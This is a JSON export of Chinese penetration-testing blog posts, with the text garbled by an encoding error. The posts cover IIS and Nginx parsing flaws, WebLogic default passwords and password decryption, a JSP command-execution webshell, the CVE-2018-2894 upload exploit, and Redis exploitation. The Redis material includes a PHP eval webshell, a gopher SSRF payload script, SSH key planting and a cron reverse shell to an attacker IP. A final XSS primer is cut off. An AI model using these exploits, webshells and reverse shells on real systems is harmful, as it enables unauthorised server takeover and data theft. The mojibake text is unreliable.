ssiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆåŸç†å’Œssiæ³¨å…¥ä¸€æ ·ï¼‰å¦‚æœæœåŠ¡å™¨å¼€å¯äº†ssiä¸cgiæ”¯æŒ,å³å¯ä¸Šä¼ shtmlæ–‡ä»¶å¹¶åœ¨shtmlæ–‡ä»¶ä¸­è¾“å…¥ssiæŒ‡ä»¤ &lt;!â€“#exec cmd=â€payloadâ€ â€“&gt;ï¼Œå¦‚ &lt;!â€“#exec cmd=â€lsâ€ â€“&gt; ,ç„¶åå†è®¿é—®è¿™ä¸ªæ–‡ä»¶å³å¯è·å¾—lsçš„ç»“æœ iiså…³äº/çš„phpè§£ææ¼æ´(iis7/7.5è§£ææ¼æ´)é€‚ç”¨ç‰ˆæœ¬ iis7/7.5å‰ææ¡ä»¶:1.php.inié‡Œçš„cgi.fix_pathinfoè®¾ç½®ä¸º1,ä¸”ç»“åˆæ–¹å¼æ˜¯fast-cgi 2.å¼€å¯Fast-CGIè¿è¡Œæ¨¡å¼ä½œç”¨: åœ¨è®¿é—®æŸä¸ªæ–‡ä»¶æ—¶ï¼Œåœ¨è·¯å¾„ååŠ  /.php(è¿™é‡Œçš„æŒ‡ä»»æ„å­—ç¬¦)ï¼Œå³å¯è®©æœåŠ¡å™¨æŠŠæŠŠè¯¥æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æå¹¶è¿”å›å¦‚å›¾æˆ‘åœ¨ä¸€ä¸ªtxtæ–‡ä»¶ä¸­å†™å…¥phpä»£ç ï¼Œè®©åè®¿é—®å®ƒæ—¶åœ¨è·¯å¾„æœ€ååŠ äº†/a.phpï¼Œå®ƒå°±è¢«è§£æä¸ºphpæ–‡ä»¶äº† PUTä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´1.é€‚ç”¨ç‰ˆæœ¬ iis6.02.å‰ææ¡ä»¶:æœåŠ¡å™¨å¼€å¯äº†webdavæœåŠ¡å¹¶ä¸”è®¾ç½®äº†å†™å…¥æƒé™ åŒæ—¶æ‰¾åˆ°è®¿é—®ç½‘ç«™çš„ç”¨æˆ·æ˜¯å“ªä¸ªå¹¶ç»™ä»–è¯»å–å’Œå†™å…¥æƒ 3.æ¦‚è¿°ï¼šç”¨PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶,å¹¶å°è¯•getshell ä¸Šä¼ ,å¹¶ä¸”ç¡®å®ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹æ— æ³•ä¸Šä¼ phpç­‰è„šæœ¬æ–‡ä»¶ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±ä¼šæƒ³åˆ°ç”¨moveæ–¹æ³•æ¥å°†txtæ–‡ä»¶è½¬åŒ–ä¸ºphpæ–‡ä»¶,ä½†ç›´æ¥moveå¾€å¾€æ˜¯ä¸è¡Œçš„ï¼Œè¦ç”¨åˆ°iis6.0è§£ææ¼æ´ï¼ŒæŠŠå®ƒå†™æˆshell.php;.txtå°±å¯ä»¥äº†getshelläº† iis6ç•¸å½¢è§£ææ¼æ´iis6.0ç¯å¢ƒä¸‹ä¼šæŠŠæ–‡ä»¶ç•¸å½¢è§£æ: 1.åœ¨ä¸€ä¸ªæ–‡ä»¶åé¢åŠ ;.ä»»æ„åç¼€åï¼šå‡è®¾æœ‰ä¸ªæ–‡ä»¶æ˜¯a.phpï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¹æˆa.php;a.txtï¼Œä»–è¿˜æ˜¯ä¼šè¢«è§£ææˆphpæ–‡ä»¶ä½†æ˜¯å› ä¸ºåç¼€åæ˜¯txtæ‰€ä»¥ä¼šç»•è¿‡ä¸€äº›é˜²æŠ¤2.åœ¨ä¸€ä¸ªåä¸º *.php(å¦‚a.php)çš„æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«è§£æä¸ºphp Nginxâ€˜/â€™å­—ç¬¦è§£ææ¼æ´ï¼ˆå’Œiis7/7.5æ¼æ´åˆ©ç”¨æ–¹æ³•ä¸€è‡´ï¼‰url/xxx.gif/xx.phpä¼šè¢«è§£æä¸ºphpæ–‡ä»¶ å‰ææ¡ä»¶:cgi.fix_pathinfo=1 ç›®å½•éå†å°æ´ å‰ææ¡ä»¶: nginx-conf æŠŠè¿™ä¸ªé€‰é¡¹æ”¹ä¸ºonå³å¯ ç›®å½•ç©¿è¶Š å‰ææ¦‚è¦:è¦ç”¨åˆ°åˆ«åaliasä½œç”¨: å½“è®¾ç½®åˆ«åæ—¶ï¼Œlocationåé¢çš„è·¯å¾„æ²¡æœ‰ç”¨/é—­åˆæ—¶ï¼Œå°±ä¼šå¼•èµ·è®¿é—® url/xx../æ—¶è¿”å›çš„ç›®å½•æ˜¯å½“å‰æ–‡ä»¶å¤¹çš„ä¸Šå±‚ç›®å½•å¯è§è¿”å›çš„ç›®å½•æ˜¯ä¸Šå±‚ç›®å½• CRLFæ³¨å…¥å‰ææ¡ä»¶ä¸äº§ç”ŸåŸå› :1.éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œæœ‰äº›ç½‘ç«™ä¼šæŠŠhttp://xxx é‡å®šå‘ä¸ºhttps://xxxæˆ–http://x.comé‡å®šå‘ä¸ºhttp://www.x.com,é‚£ä¹ˆè¿™ç§é‡å®šå‘çš„åŸç†åœ¨nginxä¸Šçš„å®ç°æ–¹å¼æ˜¯åœ¨locationå—é‡ŒåŠ å…¥return 302 http://$host:81$uri;ä¹‹ç±»çš„è¯­å¥ï¼Œè¿™é‡Œçš„$host,$urléƒ½æ˜¯å˜é‡ã€‚$hostä¸€èˆ¬ä¸ºè¯·æ±‚å¤´çš„hostå¤´éƒ¨,$urlä¸€èˆ¬ä¸ºè¯·æ±‚è¡Œé‡Œçš„è·¯å¾„éƒ¨åˆ† å¦‚ GET /url HTTP/1.1æ­¤å¤„çš„/urléƒ¨åˆ†. 2.httpå¤´éƒ¨é‡Œï¼Œ0dï¼ˆcrï¼‰å’Œ0aï¼ˆlfï¼‰å­—ç¬¦æ˜¯ç”¨æ¥åˆ†å‰²è¯·æ±‚å¤´éƒ¨åŒºåŸŸçš„å­—ç¬¦ã€‚å¤´éƒ¨çš„è¡Œæ˜¯ä»¥ä¸€ä¸ªcrlfæ¥åˆ†å‰²çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¯·æ±‚å¤´éƒ¨æ¯ä¸ªè¡Œä¹‹é—´éƒ½å­˜åœ¨ç€ä¸€ä¸ªcrlfå­—ç¬¦æ¥åˆ†å‰²å®ƒä»¬ï¼Œè®©ä»–ä»¬æˆä¸ºå¤šä¸ªç‹¬ç«‹çš„è¡Œã€‚å¤´éƒ¨ä¸bodyä¹‹é—´æœ‰ä¸¤ä¸ªcrlfæ¥åˆ†å‰²ä½œç”¨:å½“æŸå°nginxè®¾ç½®äº†å½¢å¦‚return 302 http://$host:80$uri; è¿™ç§é…ç½®æ—¶ï¼Œurlæ˜¯æˆ‘ä»¬å®Œå…¨å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨urlä¸­äººä¸ºæ„é€ crlfå­—ç¬¦æ¥å®ç°åˆ†è¡Œï¼Œä»è€Œåœ¨å“åº”å¤´ä¸­æ³¨å…¥æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„å“åº”å¤´éƒ¨ã€‚ Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7url/xxxxx.gif%20 çš„æ–‡ä»¶è¢« url/xxxxx.gif%20\\0x00.php (\\0x00é¡»åœ¨burpé‡Œçš„hexé‡Œæ”¹)éœ€å¼€å¯fastcgi ç„¶åå‘åŒ…è¯·æ±‚è¿™ä¸ªæ–‡ä»¶,å¹¶ä¸”åœ¨è¯·æ±‚æ—¶åšç‚¹æ‰‹è„š WebLogicå¼±å£ä»¤User ID systemPassword passwordLevel AdministratorUser ID weblogicPassword weblogicLevel AdministratorUser ID weblogicPassword weblogicUser ID adminPassword securityUser ID joePassword passwordUser ID maryPassword passwordUser ID systemPassword securityUser ID wlcsystemPassword wlcsystemUser ID wlpisystemPassword wlpisystem ä»»æ„æ–‡ä»¶è¯»å–åŸºç¡€ä¸Šçš„åå°å¯†ç ç ´è§£å‡è®¾æˆ‘ä»¬èƒ½å‰å°ä»»æ„æ–‡ä»¶è¯»å–,ä½†æ˜¯åå°çš„è´¦æˆ·å¯†ç æ˜¯åŠ å¯†çš„.å¦‚ä½•ç ´è§£weblogicæ–°ç‰ˆæœ¬ç”¨çš„æ˜¯AESåŠ å¯†ï¼Œè€ç‰ˆæœ¬ç”¨çš„æ˜¯3DESåŠ å¯†éƒ½æ˜¯å¯¹ç§°åŠ å¯†ï¼Œæœ‰å¯†é’¥å°±å¯è§£ å‡è®¾å‰å°å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦ç”¨åˆ°ç”¨æˆ·çš„å¯†æ–‡å’ŒåŠ å¯†çš„å¯†é’¥å³å¯ç ´è§£ã€‚è¿™ä¸¤ä¸ªæ–‡ä»¶åœ¨base_domainä¸‹, ä¸º./security/SerializedSystemIni.datå’Œconfig/config.xmlè¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯,.datæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶,å»ºè®®burpæ‰“å¼€ä¸ç„¶å®¹æ˜“ä¹±ç  æŠŠäºŒè¿›åˆ¶ä¿¡æ¯copy to fileä¿å­˜ä¸‹æ¥. è·å–config.xml xmlæ–‡æ¡£é‡Œè¿™æ‰æ˜¯ç®¡ç†å‘˜è´¦æˆ·å¼€å§‹è§£å¯†ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ https://github.com/TideSec/Decrypt_Weblogic_Password ä¸­çš„tools5 è§£å¯†æˆåŠŸã€‚ç™»å½•å°±å®Œäº‹äº† åå°ä¼ æœ¨é©¬ææƒåå°ä¼ jspæœ¨é©¬çš„waråŒ…å°±è¡Œäº†æ€ä¹ˆç”ŸæˆwaråŒ…:jar cvf shell.war æœ¨é©¬æºæ–‡ä»¶ éƒ¨ç½²-ã€‹å®‰è£…-ã€‹ä¸Šè½½æ–‡ä»¶-ã€‹é€‰æ‹©æ–‡ä»¶é€‰æ‹©waråŒ…-ã€‹ä¸€ç›´ä¸‹ä¸€æ­¥ç„¶åå®Œæˆ è®¿é—®waråŒ…ç›®å½•ä¸‹çš„æœ¨é©¬æ–‡ä»¶å³å¯ é©¬å­æ˜¯ä¸€å¥è¯é©¬å­ &lt;%Runtime.getRuntime.exec(request.getParameter(â€œcmdâ€));%&gt;å‘½ä»¤å»ºè®®ç”¨è¿™ä¸ªç½‘ç«™ç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶æœ‰å¯èƒ½ä¸ä¼šæ‰§è¡Œ http://www.jackson-t.ca/runtime-exec-payloads.html weblogic uudiç»„ä»¶é€ æˆçš„ç«¯å£æ¢æµ‹è‹¥weblogicåŠ è½½äº†uudiç»„ä»¶ï¼Œé‚£ä¹ˆåœ¨ /uddiexplorer/SearchPublicRegistries.jsp ä¼šå­˜åœ¨ç«¯å£æ¢æµ‹é—®é¢˜ å¯¹è¯¥jspä¼ å‚ ?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001 æˆ‘ä»¬é€šè¿‡æ”¹å˜operatorçš„ç«¯å£å‘åŒ…ï¼Œçœ‹é¡µé¢å˜åŒ–å³å¯ç«¯å£æ¢æµ‹ ç«¯å£ä¸å­˜åœ¨ï¼Œå°±ä¼šæœ‰could not connect over HTTP to server: å­˜åœ¨å°±æœ‰404 error code (Not Found). Please ensure that your URL is correct, Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰WebLogicç®¡ç†ç«¯æœªæˆæƒçš„ä¸¤ä¸ªé¡µé¢å­˜åœ¨ä»»æ„ä¸Šä¼ getshellæ¼æ´ï¼Œå¯ç›´æ¥è·å–æƒé™ã€‚ä¸¤ä¸ªé¡µé¢åˆ†åˆ«ä¸º/ws_utc/begin.doï¼Œ/ws_utc/config.do å½±å“ç‰ˆæœ¬ Oracle WebLogic Serverï¼Œç‰ˆæœ¬10.3.6.0ï¼Œ12.1.3.0ï¼Œ12.2.1.2ï¼Œ12.2.1.3ã€‚ å‰ææ¡ä»¶:ç®¡ç†å‘˜åœ¨åå° -&gt;base_domain-&gt;é…ç½®-&gt;ä¸€èˆ¬ä¿¡æ¯-&gt;é«˜çº§ï¼ŒæŠŠè¿™ä¸ªå‹¾é€‰äº† å¼€å¯åæˆ‘ä»¬æ¥åˆ° http://ip:port/ws_utc/config.do ï¼ŒæŠŠè¿™ä¸ªæ”¹ä¸ºè·¯å¾„ /user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css ç„¶åç‚¹å®‰å…¨ï¼Œå†ç‚¹æ·»åŠ ï¼ŒæŠŠæˆ‘ä»¬çš„jspé©¬ä¼ ä¸Šå» æŠ“åŒ…ï¼Œè·å–è¯¥æœ¨é©¬çš„æ—¶é—´æˆ³ è®¿é—®http://123.57.137.109:7001/ws_utc/css/config/keystore/æ—¶é—´æˆ³_æ–‡ä»¶å æˆåŠŸè®¿é—®æˆ‘çš„é©¬å„¿ä¿®å¤: è®¾ç½®Config.doã€begin.doé¡µé¢ç™»å½•æˆæƒåè®¿é—® ,å‡çº§ï¼ŒåŠ waf","categories":[],"tags":[{"name":"ä¸­é—´ä»¶å®‰å…¨","slug":"ä¸­é—´ä»¶å®‰å…¨","permalink":"http://const27.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"}]},{"title":"redisçš„ä¸€äº›æ”»å‡»æ–¹å¼","slug":"redisçš„ä¸€äº›æ”»å‡»æ–¹å¼","date":"2021-06-28T13:52:13.411Z","updated":"2021-06-28T13:43:22.470Z","comments":true,"path":"2021/06/28/redisçš„ä¸€äº›æ”»å‡»æ–¹å¼/","link":"","permalink":"http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"å‚è€ƒ https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/ Redisé»˜è®¤ç«¯å£6379å¦‚æœå­˜åœ¨æœªæˆæƒé—®é¢˜ï¼Œé‚£ä¹ˆä»»ä½•äººéƒ½å¯ä»¥å¾€è¿™å°RedisæœåŠ¡å™¨ä¸Šä¼ è¾“å‘½ä»¤ ä¸€èˆ¬Redisæ”»å‡»æœ‰å†™shellï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼Œå†™å¯†é’¥ï¼Œå†™crontabåå¼¹shell, infoè·å¾—æ•æ„Ÿä¿¡æ¯,å…¶ä¸­å†™å¯†é’¥å’Œå†™crontabä¸æ˜¯é‚£ä¹ˆçš„å¥½ç”¨ åœ¨è®²æ”»å‡»ä¹‹å‰ï¼Œè¦è®²ä¸€ä¸‹RESPåè®® RESPåè®®RedisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡RESPåè®®çš„é€šä¿¡ã€‚respåè®®ä»redis1.2å¼•å…¥ã€‚è¿™ä¸ªåè®®æŠŠæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¹‹é—´çš„æ•°æ®ä»¥ä¸€ç§åºåˆ—åŒ–çš„å½¢å¼å¤„ç†å¹¶ä¼ è¾“ åœ¨RESPä¸­ï¼ŒæŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼šå¯¹äºSimple Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯+å¯¹äºerrorï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯-å¯¹äºIntegerï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯:å¯¹äºBulk Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯$ï¼Œå‘é€ç»™æœåŠ¡å™¨çš„å‘½ä»¤å°±æ˜¯æ”¾åœ¨æ•°ç»„ä¸­çš„BulkStringsç±»å‹å¯¹äºarrayï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯*æ­¤å¤–ï¼ŒRESPèƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„Bulk Stringsæˆ–Arrayçš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤ºNullå€¼ã€‚åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥&quot;\\r\\n&quot;(CRLF)ç»“æŸã€‚ åŒæ—¶æ¯ä¸ªç±»å‹å­—èŠ‚åç´§è·Ÿç€è¯¥ç±»å‹çš„é•¿åº¦ï¼Œç„¶åæ˜¯CRLFï¼Œç„¶åæ˜¯è¯¥ç±»å‹çš„å€¼ è¯´äº†è¿™ä¹ˆå¤šï¼Œè‚¯å®šä¸ä¼šå¾ˆæ‡‚ï¼Œä¸Šå›¾ å³å‘é€çš„æ—¶å€™ï¼Œæ˜¯ç”¨ä¸‰ä¸ªå…ƒç´ çš„æ•°ç»„(*3),ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ä¸‰ä¸ªé•¿åº¦çš„BulkString($3)å…¶å€¼ä¸ºset,ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å››ä¸ªé•¿åº¦çš„BulkSting($4)å…¶å€¼ä¸ºname,ç¬¬ä¸‰ä¸ªå…ƒç´ æ˜¯å››ä¸ªé•¿åº¦é•¿çš„BulkString($4)å…¶å€¼ä¸ºtest,æœåŠ¡å™¨è¿”å›SimpleStringï¼ˆ+ï¼‰OKï¼Œä»¥ä¸‹ç±»æ¨ gopheråè®®æ˜¯httpåè®®å‡ºç°å¸¸ç”¨çš„ä¸€ä¸ªåè®®ï¼ŒSSRFçš„ä¸‡é‡‘æ²¹ã€‚ æ ¼å¼ï¼šgopher://IP:port/_{TCP/IPæ•°æ®æµ} å¦‚ä½•redisè¿œç¨‹é“¾æ¥redis-cli -h ip -p portxxx.xxx.xxx.xxx:x&gt;AUTH &quot;password&quot; (æœªæˆæƒå°±ä¸éœ€è¦è¾“å…¥å¯†ç ) æ”»å‡»æ–¹æ³•ä¸€:å†™shellå†™shellçš„è¯,rediséœ€æ‰§è¡Œçš„å‘½ä»¤åº”è¯¥ç±»ä¼¼è¿™æ · å¦‚æœä½ èƒ½ç›´æ¥redis -h ip -n 6379 æœªæˆæƒè¿æ¥ä¸ŠredisæœåŠ¡å™¨ä¸”æƒé™å¤Ÿé«˜ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤flushall &#x2F;&#x2F;æ¸…ç©ºæ•°æ®åº“set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39; &#x2F;&#x2F;ä¸ºé”®åä¸º1çš„é”®èµ‹å€¼config set dir &#x2F;var&#x2F;www&#x2F;htmlconfig set dbfilename shell.php &#x2F;&#x2F;è®¾ç½®æ•°æ®å­˜å‚¨åˆ°ç£ç›˜æ—¶çš„æ–‡ä»¶è·¯å¾„save &#x2F;&#x2F;æ•°æ®åº“å…¨éƒ¨ä¿å­˜è‡³ç£ç›˜ æ”»å‡»è„šæœ¬å¦‚ä¸‹(ä¸»è¦ç”¨äºssrf) #python3import urllibprotocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;ip&#x3D;&quot;192.168.163.128&quot;port&#x3D;&quot;6379&quot;shell&#x3D;&quot;\\n\\n&lt;?php eval($_GET[\\&quot;cmd\\&quot;]);?&gt;\\n\\n&quot;filename&#x3D;&quot;shell.php&quot;path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;passwd&#x3D;&quot;&quot;cmd&#x3D;[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),&#x2F;&#x2F;è¿™é‡Œçš„IFSæ›¿æ¢ä¸æ˜¯å¾ˆç†è§£æ˜¯å•¥æ„æ€.. &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd)) &#x2F;&#x2F;å¦‚æœéœ€è¦å¯†ç ï¼Œå°±æŠŠå¯†ç è¾“å…¥å‘½ä»¤åŠ å…¥åˆ°cmdç¬¬ä¸€ä½payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;def redis_format(arr): CRLF&#x3D;&quot;\\r\\n&quot; redis_arr &#x3D; arr.split(&quot; &quot;) cmd&#x3D;&quot;&quot; cmd+&#x3D;&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+&#x3D;CRLF return cmdif __name__&#x3D;&#x3D;&quot;__main__&quot;: for x in cmd: payload +&#x3D; urllib.quote(redis_format(x)) print(payload) è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†payloadï¼Œç›´æ¥curlä¸€ä¸‹ï¼Œå°±å†™å…¥shelläº† æ”»å‡»æ–¹æ³•äºŒ:infoè·å–æ•æ„Ÿä¿¡æ¯è¿ä¸Šå ä½¿ç”¨infoå‘½ä»¤ æ”»å‡»æ–¹æ³•ä¸‰ï¼šå†™å…¥sshå…¬é’¥é«˜ç‰ˆæœ¬ä¸å¥½ç”¨ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬çš„redisæƒé™æ˜¯æ— æ³•å¾€/rootç›®å½•å†™å…¥çš„.è€Œè¿™ä¸ªæ–¹æ³•åˆ™éœ€è¦å¾€/root/.sshå†™å…¥sshå…¬é’¥è¾¾åˆ°æ— å¯†ç sshé“¾æ¥çš„ç›®çš„ é¦–å…ˆåœ¨æ”»å‡»æœºä¸Šç”Ÿæˆä¸€å¯¹ä¸éœ€è¦å¯†ç çš„å…¬é’¥ç§é’¥ ç„¶åä¾æ¬¡è¾“å…¥ config set dir &#x2F;root&#x2F;.sshconfig set dirfilename authorized_keyssave ç„¶åsshå…å¯†ç™»å½• ssh -i id_rsa root@ip æ”»å‡»æ–¹æ³•å››ï¼šåˆ©ç”¨cronè®¡åˆ’ä»»åŠ¡åå¼¹shellä»…åœ¨centosç³»ç»Ÿå¥æ•ˆï¼ŒUbuntuä¸è¡Œ å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ï¼Œä½†ubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/crontabs/æƒé™å¿…é¡»æ˜¯600ä¹Ÿå°±æ˜¯-rw-------æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™(root) INSECURE MODE (mode 0600 expected)ï¼Œè€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™ ç”±äºç³»ç»Ÿçš„ä¸åŒï¼Œcrontrabå®šæ—¶æ–‡ä»¶ä½ç½®ä¹Ÿä¼šä¸åŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨/var/spool/cron/Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨/var/spool/cron/crontabs/Centoså’ŒUbuntuå‡å­˜åœ¨çš„ï¼ˆéœ€è¦rootæƒé™ï¼‰/etc/crontab PSï¼šé«˜ç‰ˆæœ¬çš„redisé»˜è®¤å¯åŠ¨æ˜¯redisæƒé™ï¼Œæ•…å†™è¿™ä¸ªæ–‡ä»¶æ˜¯è¡Œä¸é€šçš„ å‘½ä»¤å¦‚ä¸‹set x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.131&#x2F;888 0&gt;&amp;1\\n&quot;config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;config set dbfilename rootsave æŠŠä¸Šé¢é‚£ä¸ªè„šæœ¬æ”¹æ”¹å°±èƒ½å®ç°ssrfäº†","categories":[],"tags":[{"name":"å¤–å›´æ‰“ç‚¹","slug":"å¤–å›´æ‰“ç‚¹","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"}]},{"title":"XSSçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µ","slug":"é‡æ¸©XSS","date":"2021-06-28T13:52:13.409Z","updated":"2021-06-28T13:40:58.776Z","comments":true,"path":"2021/06/28/é‡æ¸©XSS/","link":"","permalink":"http://const27.com/2021/06/28/%E9%87%8D%E6%B8%A9XSS/","excerpt":"","text":"åŒæºç­–ç•¥ä¸è·¨åŸŸåŒæºç­–ç•¥åŒæºçš„å®šä¹‰è‹¥ä¸¤ä¸ªURL åè®®ï¼Œç«¯å£ï¼Œhostéƒ½ç›¸åŒï¼Œåˆ™è¿™ä¸¤ä¸ªURLåŒæºã€‚è¿™ä¸ªæ–¹æ¡ˆå«åšâ€œåè®®/ä¸»æœº/ç«¯å£å…ƒç»„â€ï¼Œæˆ–è€…ç›´æ¥æ˜¯ â€œå…ƒç»„â€ åŒæºç­–ç•¥åˆåˆ†ä¸ºDOMåŒæºç­–ç•¥(ç¦æ­¢å¯¹ä¸åŒæºçš„é¡µé¢çš„DOMè¿›è¡Œæ“ä½œ)å’ŒXMLHttpRequest(ç¦æ­¢XHRå¯¹è±¡é¡¹ä¸åŒæºçš„æœåŠ¡å™¨åœ°å€å‘èµ·HTTPè¯·æ±‚)åŒæºç­–ç•¥ åŒæºç­–ç•¥çš„ä½œç”¨é™åˆ¶ä¸€ä¸ªJSè„šæœ¬å¯¹ä¸åŒæºçš„URLè¿›è¡Œæ“ä½œã€‚ è¿™ä¹ˆè¯´å¯èƒ½ä¼šæœ‰ç‚¹æŠ½è±¡ï¼Œé‚£ä¸å¦‚çœ‹çœ‹ä¸‹é¢çš„ä¾‹å­: 1.å¦‚æœæ²¡æœ‰DOMåŒæºç­–ç•¥ï¼Œå°±æ„å‘³ç€ä¸€ä¸ªé¡µé¢å¯ä»¥å¯¹ä»»æ„é¡µé¢çš„DOMè¿›è¡Œæ“ä½œã€‚é‚£ä¹ˆå°±ä¼šå¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜:åšä¸€ä¸ªå‡ç½‘ç«™ï¼Œå¹¶æ’å…¥ä¸€ä¸ªå æ»¡å…¨é¡µé¢çš„iframeæŒ‡å‘ä¸€ä¸ªç™»é™†ç•Œé¢å¦‚é“¶è¡Œç™»å½•ç•Œé¢ã€‚ç”¨æˆ·è¿›æ¥åä¼šå‘ç°é™¤äº†åŸŸåä¸åŒï¼Œå…¶ä»–éƒ½å’Œæ­£å¸¸çš„é“¶è¡Œç™»é™†ç•Œé¢ä¸€è‡´ã€‚è‹¥ç”¨æˆ·è¾“å…¥äº†è´¦å·å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è·¨åŸŸè¯»å–åˆ°é“¶è¡Œç™»é™†ç•Œé¢çš„domæ ‘ï¼Œä»è€Œè¯»å–ç”¨æˆ·è¾“å…¥çš„è´¦å·å¯†ç ã€‚ 2.å¦‚æœæ²¡æœ‰XMLHttpRequestï¼Œå°±æ„å‘³ç€å¯ä»¥ä¸€ä¸ªé¡µé¢å¯ä»¥å‘ä»»æ„é¡µé¢å‘èµ·HTTPè¯·æ±‚ã€‚é‚£ä¹ˆå°±ä¼šå¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜:å½“ä¸€ä¸ªç”¨æˆ·ç™»é™†äº†æŸä¸ªç³»ç»Ÿï¼Œå¦‚é“¶è¡Œä¸ªäººç³»ç»Ÿï¼Œæ­¤æ—¶é“¶è¡Œç½‘ç«™ä¼šç»™ç”¨æˆ·è¿”å›cookieã€‚å¦‚æœç”¨æˆ·æ­¤æ—¶è®¿é—®äº†æˆ‘ä»¬çš„æ¶æ„ç½‘ç«™ï¼Œå°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ¶æ„ç½‘ç«™ä¸­çš„æ¶æ„AJAXä»£ç ï¼Œæ­¤AJAXä»£ç 